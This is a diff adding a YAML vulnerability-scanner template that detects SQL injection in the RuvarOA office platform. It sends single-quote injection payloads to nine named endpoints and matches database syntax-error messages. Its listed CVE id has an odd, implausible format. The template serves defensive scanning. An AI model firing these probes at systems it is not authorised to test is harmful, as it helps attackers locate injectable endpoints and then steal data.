@@ -1,0 +1,45 @@
+id: ruvaroa-multiple-sqli
+
+info:
+  name: RuvarOA multiple - SQL Injection
+  author: qwtd
+  severity: high
+  description: |  
+    RuvarOA协同办公平台多处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - https://github.com/wy876/POC/blob/17fce9e8a8e4c711753f586f24a2b8351f367aee/RuvarOA%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0/RuvarOA%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%E5%A4%9A%E5%A4%84%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  remediation: |
+    升级RuvarOA到高版本
+  classification:
+    cve-id: 2024-105251420
+    cvss-score: 7.8
+    cwe-id: CWE-89
+  metadata:
+    date:  2024-05-11
+    version: RuvarOA V6.01 、RuvarOA V12.01
+    fofa-query: body="txt_admin_key"
+  tags: RuvarOA
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/DepartmentPlan/department_plan_attach_download.aspx?sys_file_storage_id=%27'
+      - '{{BaseURL}}/filemanage/file_memo.aspx?file_id=%27'
+      - '{{BaseURL}}/WorkFlow/wf_work_form_save.aspx?office_missive_id=%27'
+      - '{{BaseURL}}/WorkFlow/wf_office_file_history_show.aspx?id=1%27'
+      - '{{BaseURL}}/WorkFlow/wf_get_fields_approve.aspx?template_id=%27'
+      - '{{BaseURL}}/include/get_dict.aspx?bi_value=1&bt_id=1%27'
+      - '{{BaseURL}}/LHMail/email_attach_delete.aspx?attach_id=%27'
+      - '{{BaseURL}}/WorkPlan/WorkPlanAttachDownLoad.aspx?sys_file_storage_id=1%27'
+      - '{{BaseURL}}/WorkFlow/OfficeFileDownload.aspx?filename=1%27'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '引号不完整'
+          - '附近有语法错误'
+        condition: and
+      - type: status
+        status:
+          - 500
